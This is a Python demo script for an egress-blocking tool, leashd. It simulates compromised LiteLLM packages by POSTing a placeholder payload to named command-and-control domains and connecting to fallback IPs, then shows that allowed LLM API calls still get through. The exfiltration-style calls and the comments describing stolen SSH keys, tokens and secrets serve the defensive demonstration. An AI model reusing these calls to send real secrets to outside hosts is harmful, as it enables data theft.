#!/usr/bin/env python3
"""
LiteLLM supply-chain attack demo for leashd.

This app simulates what the compromised LiteLLM 1.82.7/1.82.8 packages
(March 2026, TeamPCP campaign) attempted to do at import time:

  1. Phone home to models.litellm.cloud (primary C2 endpoint)
  2. Phone home to checkmarx.zone (attacker-controlled drop server)
  3. Make a legitimate LLM API call (allowed by policy)

When run under leashd with the accompanying rules.yaml (default: block),
steps 1 and 2 are blocked at the kernel level before a single byte leaves
the host.  Step 3 succeeds because api.openai.com is explicitly allowed.

Usage (from repo root, after `make build`):
    sudo ./bin/leashd run --dir samples/litellm-supply-chain \\
        -- python3 samples/litellm-supply-chain/app.py

Run without leashd (so you can see the raw connection attempts):
    python3 samples/litellm-supply-chain/app.py --no-leashd
"""

import argparse
import os
import socket
import sys
import time
import urllib.error
import urllib.request

# ── Colour helpers ───────────────────────────────────────────────────────────

BOLD   = "\033[1m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
RED    = "\033[31m"
CYAN   = "\033[36m"
GREY   = "\033[90m"
RESET  = "\033[0m"


def banner(text: str) -> None:
    width = 68
    print(f"\n{CYAN}{'═' * width}")
    print(f"  {text}")
    print(f"{'═' * width}{RESET}\n")


def step(label: str, detail: str = "") -> None:
    print(f"{BOLD}[{label}]{RESET}  {detail}")


def ok(msg: str) -> None:
    print(f"  {GREEN}✓ {msg}{RESET}")


def blocked(msg: str) -> None:
    print(f"  {RED}✗ BLOCKED — {msg}{RESET}")


def warn(msg: str) -> None:
    print(f"  {YELLOW}⚠ {msg}{RESET}")


def info(msg: str) -> None:
    print(f"  {GREY}{msg}{RESET}")


# ── Connection helpers ───────────────────────────────────────────────────────

def http_post(url: str, payload: bytes = b"data=exfiltrated", timeout: int = 5) -> bool:
    """POST payload to url. Returns True on success."""
    try:
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/octet-stream")
        req.add_header("User-Agent", "python-litellm/1.82.8")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            ok(f"POST {url} → {resp.status} {resp.reason}")
            return True
    except urllib.error.HTTPError as exc:
        # Connection reached the server — leashd allowed it; server rejected it
        ok(f"POST {url} → reached server (HTTP {exc.code} {exc.reason})")
        return True
    except urllib.error.URLError as exc:
        blocked(f"POST {url} → {exc.reason}")
        return False
    except Exception as exc:
        blocked(f"POST {url} → {exc}")
        return False


def http_get(url: str, timeout: int = 5) -> bool:
    """GET url. Returns True on success."""
    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "leashd-litellm-demo/1.0")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body_len = len(resp.read())
            ok(f"GET {url} → {resp.status} ({body_len} bytes)")
            return True
    except urllib.error.HTTPError as exc:
        # Connection reached the server — leashd allowed it; server rejected it
        ok(f"GET {url} → reached server (HTTP {exc.code} {exc.reason})")
        return True
    except urllib.error.URLError as exc:
        blocked(f"GET {url} → {exc.reason}")
        return False
    except Exception as exc:
        blocked(f"GET {url} → {exc}")
        return False


def tcp_connect(host: str, port: int, timeout: int = 3) -> bool:
    """Attempt a raw TCP connection. Returns True on success."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        ok(f"TCP {host}:{port} → connected")
        return True
    except (OSError, socket.timeout) as exc:
        blocked(f"TCP {host}:{port} → {exc}")
        return False
    finally:
        sock.close()


# ── Simulated malicious payload ──────────────────────────────────────────────

def simulate_exfiltration() -> None:
    """
    Reproduces the network behaviour of the compromised LiteLLM 1.82.7/1.82.8
    packages.  All calls should be BLOCKED by leashd.
    """
    banner("Phase 1 — Simulated malicious payload (compromised litellm import)")

    info("The real 1.82.7 payload ran this code inside proxy/proxy_server.py")
    info("The real 1.82.8 payload ran via a .pth file on every Python start")
    print()

    # C2 targets: (domain, fallback_ip, port)
    # Fallback IPs use RFC 5737 TEST-NET addresses — they never reach a real
    # server but always produce a kernel-level TCP block event in leashd.
    c2_targets = [
        ("models.litellm.cloud", "203.0.113.10", 443, "primary C2 / exfiltration"),
        ("checkmarx.zone",       "198.51.100.10", 443, "secondary drop server"),
    ]

    fake_payload = b'{"host":"demo-vm","secrets":"[redacted for demo]"}'

    for domain, fallback_ip, port, role in c2_targets:
        step(f"Domain → {domain}", f"{role}")
        info(f"In the real attack: harvested SSH keys, env vars, cloud tokens, k8s secrets")
        http_post(f"https://{domain}/collect", payload=fake_payload)
        print()

        step(f"IP fallback → {fallback_ip}:{port}", f"{role} (hardcoded — survives DNS takedown)")
        info("Always produces a kernel-level TCP block event even when the domain is down")
        tcp_connect(fallback_ip, port)
        print()


# ── Legitimate LLM usage ─────────────────────────────────────────────────────

def simulate_legitimate_usage() -> None:
    """
    Shows that the app can still reach the explicitly allowed LLM API
    endpoints while everything else remains blocked.
    """
    banner("Phase 2 — Legitimate LLM API calls (should be ALLOWED)")

    step("OpenAI API", "GET https://api.openai.com/  ← allowed by 'openai' rule")
    http_get("https://api.openai.com/")
    print()

    step("Anthropic API", "GET https://api.anthropic.com/  ← allowed by 'anthropic' rule")
    http_get("https://api.anthropic.com/")
    print()


# ── Default-block demonstration ──────────────────────────────────────────────

def simulate_default_block() -> None:
    """
    Exercises destinations that have no explicit allow rule and should be
    blocked by the default policy.
    """
    banner("Phase 3 — Destinations blocked by default policy")

    destinations = [
        ("GitHub",        "http",  "https://github.com/"),
        ("PyPI (docs)",   "http",  "https://docs.pypi.org/"),
        ("Example.com",   "http",  "http://example.com/"),
        ("Cloudflare DNS","tcp",   ("1.1.1.1", 53)),
    ]

    for label, kind, target in destinations:
        if kind == "http":
            step(label, f"GET {target}")
            http_get(target)
        else:
            host, port = target
            step(label, f"TCP {host}:{port}")
            tcp_connect(host, port)
        print()


# ── Entry point ──────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="LiteLLM supply-chain attack demo for leashd."
    )
    parser.add_argument(
        "--phase",
        choices=["all", "exfil", "legit", "default-block"],
        default="all",
        help="Which phase to run (default: all)",
    )
    parser.add_argument(
        "--no-leashd",
        action="store_true",
        help="Print a reminder that connections will not be enforced",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.3,
        help="Seconds between connection attempts (default: 0.3)",
    )
    args = parser.parse_args()

    if args.no_leashd:
        print(
            f"\n{YELLOW}⚠  Running WITHOUT leashd — connections are NOT enforced.{RESET}\n"
            f"   Re-run under leashd to see blocks take effect:\n\n"
            f"   sudo ./bin/leashd run --dir samples/litellm-supply-chain \\\n"
            f"       -- python3 samples/litellm-supply-chain/app.py\n"
        )

    banner("leashd × LiteLLM supply-chain attack demo")
    print(
        f"  Scenario: compromised litellm 1.82.8 (TeamPCP, March 2026)\n"
        f"  Policy:   default=block, only api.openai.com + api.anthropic.com allowed\n"
        f"  Goal:     show leashd blocks exfiltration before data leaves the host\n"
    )

    phases = {
        "exfil":         simulate_exfiltration,
        "legit":         simulate_legitimate_usage,
        "default-block": simulate_default_block,
    }

    to_run = list(phases.keys()) if args.phase == "all" else [args.phase]

    for phase in to_run:
        phases[phase]()
        time.sleep(args.delay)

    banner("Done — check .leashd/events.jsonl for kernel-level verdicts")
    print(
        f"  {GREY}cat samples/litellm-supply-chain/.leashd/events.jsonl"
        f" | python3 -m json.tool{RESET}\n"
        f"  {GREY}grep '\"verdict\":\"block\"'"
        f" samples/litellm-supply-chain/.leashd/events.jsonl"
        f" | python3 -m json.tool{RESET}\n"
    )


if __name__ == "__main__":
    main()
